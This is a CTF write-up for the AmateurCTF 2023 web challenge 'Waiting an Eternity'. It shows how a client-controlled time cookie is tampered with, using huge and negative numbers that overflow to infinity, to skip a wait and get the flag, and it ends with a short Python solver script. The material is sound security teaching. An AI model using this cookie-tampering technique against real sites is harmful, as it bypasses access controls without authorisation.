---
title: AmateurCTF '23 - Web - Waiting an Eternity
date: '2023-07-18'
tags: ['ctf', 'web', 'amateurctf', 'amateurctf23', 'writeup', 'integer-overflow', 'flask']
draft: false
summary: Utilizing integer overflow in the cookie to make the web-app wait for -inf time.
---

## Challenge Description

My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I've been waiting a couple days and it's still asking me to wait. I'm getting a little impatient, could you help me get the flag?

Author: voxal

Connection info: [waiting-an-eternity.amt.rs](https://waiting-an-eternity.amt.rs)

## Solution

Firstly, I opened up the provided link directly in the browser

![chal](/static/writeups/amateurctf2023/web/et-1.png)

Next, we'll analyze the request and it's response in `Burp's` repeater

![chal](/static/writeups/amateurctf2023/web/et-2.png)

We can see that a `url` is being set to `/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a` and another header `Refresh` is being used to a _fairly_ large number. On visting the page:

![chal](/static/writeups/amateurctf2023/web/et-3.png)

Weird. Analyzing this request's response in repeater:

![chal](/static/writeups/amateurctf2023/web/et-4.png)

We can see that a `Cookie` is being set `time`. We can see that the time is being set to `EPOCH` standard time. Let's try passing -1 as the value of the cookie:

![chal](/static/writeups/amateurctf2023/web/et-5.png)

Okay, we can see that page prints the epoch value. Let's try and overflow it and see what happens:

`Cookie: time=100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`

![chal](/static/writeups/amateurctf2023/web/et-6.png)

Well, adding more and more zero's until we get `inf`

`Cookie: time=1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`

![chal](/static/writeups/amateurctf2023/web/et-7.png)

This worked. Let's try and convert this number to a negative number and hope we get the flag

![chal](/static/writeups/amateurctf2023/web/et-8.png)

And we get the flag!.

---

However, knowing me; do you think I'd let this go without an automated `get_flag.py` script?

```python
import requests

url = "https://waiting-an-eternity.amt.rs"

print("[+] Getting the redirected url with secretcode:")
r = requests.get(url)
_dir = r.headers['Refresh'].split(';')[1][5:]
print(f"[*] Got path: {_dir}")
print(f"[*] Getting the flag: ", end='')
cookies = {
	'time' : '-1' + '0' * 330
}
r = requests.get(url + _dir, cookies=cookies)
print(r.text)
```

and; in the output, we get the flag

![chal](/static/writeups/amateurctf2023/web/et-9.png)
